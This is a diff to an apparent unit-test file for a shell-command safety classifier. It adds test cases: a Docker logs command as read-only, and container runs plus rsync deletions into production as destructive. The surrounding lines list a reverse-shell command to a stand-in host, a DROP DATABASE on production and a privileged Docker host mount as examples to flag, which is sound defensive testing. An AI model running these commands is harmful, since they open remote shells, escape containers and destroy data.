@@ -9,6 +9,7 @@ describe('classifyCommand', () => {
     expect(classifyCommand('df -h').class).toBe('read-only');
     expect(classifyCommand('systemctl status nginx').class).toBe('read-only');
     expect(classifyCommand('docker ps').class).toBe('read-only');
+    expect(classifyCommand('docker logs app').class).toBe('read-only');
   });
 
   it('classifies sudo/su/doas as privileged', () => {
@@ -48,6 +49,12 @@ describe('classifyCommand', () => {
     "psql staging -c 'ALTER TABLE jobs ADD COLUMN reviewed boolean'",
     "psql -c 'DROP DATABASE production'",
     "bash -c 'bash -i >& /dev/tcp/example.test/4444 0>&1'",
+    'docker run --privileged -v /:/host alpine sh',
+    'docker compose up -d',
+    'docker-compose up -d',
+    'env docker container run alpine sh',
+    'rsync --delete -a /tmp/src/ /srv/prod/',
+    'rsync -a /tmp/src/ /srv/prod/',
   ])('classifies production-impact command as destructive: %s', (command) => {
     expect(classifyCommand(command).class).toBe('destructive');
   });
